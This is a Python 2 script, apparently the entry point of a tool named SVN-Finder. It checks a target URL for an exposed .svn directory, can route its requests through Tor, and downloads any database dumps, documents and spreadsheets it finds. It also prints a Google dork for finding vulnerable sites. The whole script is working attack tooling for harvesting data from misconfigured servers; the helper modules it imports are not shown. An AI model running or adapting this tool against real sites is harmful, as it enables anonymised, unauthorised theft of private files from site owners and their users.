#!/usr/bin/python

import time
from sys import argv

#Own modules
import http, tor, file_handler

templates = [ "svn_version_x" ]

def confirm():
    while True:
        input = raw_input("Continue? [y/n] ")
        if input == "n": return False
        elif input == "y": return True 

try:
    print file('banner', 'r').read()

    #Do we have all the arguments to kick this badboy off?
    if len(argv) >= 2:

        #Do we need (and are we using) Tor?
        if len(argv) == 3 and argv[2] == "--check-tor":
            http.tor = True
            if not tor.checkTor(): quit()

        #Just notifying you about your current connection status
        tor.printConnInfo()
        if not confirm():
            print "Aborting..."
            quit()

        #Lets fire this bad-boy up
        try:
            """
            Firts we are fetching the initial directory structure (if availible)
            This allows us to determine what download template to use.
            If this is is not availible we will run every module until we found the matching template
            For more info on these structures look at svn_template.py
            """
            print "[*] Visiting: " + argv[1] + "/.svn"
            response = http.getUrl(argv[1] + "/.svn")

            if response.getcode() == 404:
                print "[!] Bummer, the target doesn't seem to be vulnerable (got a 404 on the .svn directory). Quiting..."
                quit()

            if response.getcode() != 200: #I'm lazy so you can deal with unexpected response codes
                print "[?] An unexpected response was recieved. The recieved response code was '%u'" % response_code
           
            #Defautl regex of stuff we want to download
            regex = r"(.sql|.txt|.pdf|.doc|.xls)$"
 
            # Awesome .svn exists, lets see who want to come out and play
            import svn_version_x
            svn_version_x.test(argv[1])
            svn_version_x.download(argv[1], regex)
        except Exception, e:
            print "[!] Bummer, the target doesn't seem to be vulnerable... (Or an error has occured in SVN-Finder)"
            print "[!] Exception: %s" % str(e)
            quit()

    else:
        print "[!] Incorrect use of the application"
        print
        print "[*] Usage: " + argv[0] + " <url>"
        print "[*] Example: " + argv[0] + " http://damnsecure.org/directory/sub/"
        print
        print "[*] Google dork: \".svn\" intitle:\"Index of\" site:<domain>"
        print
except KeyboardInterrupt:
    print "Quiting..."
    quit()
